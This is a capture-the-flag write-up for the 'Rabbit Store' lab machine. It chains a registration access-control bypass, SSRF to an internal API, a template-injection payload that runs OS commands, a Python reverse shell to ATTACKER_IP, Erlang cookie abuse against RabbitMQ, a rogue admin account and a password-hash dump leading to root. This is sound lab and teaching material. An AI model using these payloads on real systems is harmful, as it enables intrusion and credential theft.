# Rabbit Store — Clean Exploit Writeup

## Recon

### Network Scan

```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.52
```

- Web app redirects to `cloudsite.thm`
- Backend API inferred from headers: Express (`X-Powered-By`)

---

## Initial Access

### Account Manipulation

- Register a user
- Modify request during registration:

  ```json
  {
    "subscription": "active"
  }
  ```

- Bypasses access control → unlocks upload functionality

---

## File Upload + Code Review

- Upload endpoint returns:

  ```
  /api/uploads/<uuid>
  ```

- File retrieval works but no execution

### JavaScript Analysis

- `custom_script.js` reveals:
  - File upload via URL
  - Backend fetch behavior → SSRF vector

---

## SSRF to Internal API

### Endpoint Discovery

- Fuzz `/api/` → `/api/docs` discovered
- Direct access blocked

### SSRF Bypass

```
http://127.0.0.1:3000/api/docs
```

- Port 3000 → internal Express API
- API documentation exposed

---

## SSTI → Remote Code Execution

### Vulnerable Endpoint

```
POST /api/fetch_messeges_from_chatbot
```

- Parameter: `username`
- Reflected unsafely → SSTI confirmed

### Exploit Payload

```json
{
  "username": "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /home/azrael/user.txt').read()}}"
}
```

- Reads user flag

---

## Internal Enumeration

- Check open ports:

  ```
  ss -tuln
  ```

- Relevant services:
  - 4369 → Erlang Port Mapper
  - 25672 → RabbitMQ clustering

---

## RabbitMQ Exploitation

### Erlang Cookie Abuse

- Extract `.erlang.cookie`
- Use Erlang distribution protocol for shell access

Tool:

```
erl-matter (shell-erldp.py)
```

### Reverse Shell

```bash
python3 -c 'import socket,subprocess,os;
s=socket.socket();
s.connect(("ATTACKER_IP",9002));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty; pty.spawn("sh")'
```

---

## Privilege Escalation via RabbitMQ

### Prepare Access

```
chmod 600 ~/.erlang.cookie
```

### Create Admin User

```
rabbitmqctl add_user imposter 123
rabbitmqctl set_user_tags imposter administrator
```

---

## Extract Credentials

### Query API

```
curl -u imposter:123 http://localhost:15672/api/users
```

- Retrieve password hashes

---

## Root Password Recovery

- Target: `root` user hash
- Decode:

```
echo -n '<hash>' | base64 -d | xxd -p
```

- Extract usable password

---

## Root Access

```
su root
cat /root/root.txt
```

---

## Key Exploit Chain

1. Broken registration logic → privilege escalation
2. SSRF via file upload URL
3. Internal API exposure
4. SSTI → RCE
5. Erlang cookie reuse → RabbitMQ access
6. Admin creation → credential dump
7. Hash decode → root access

---

## Critical Weaknesses

- Client-controlled authorization
- SSRF with internal network reach
- SSTI in backend template rendering
- Insecure Erlang cookie handling
- Exposed RabbitMQ management API
- Weak credential storage assumptions

---
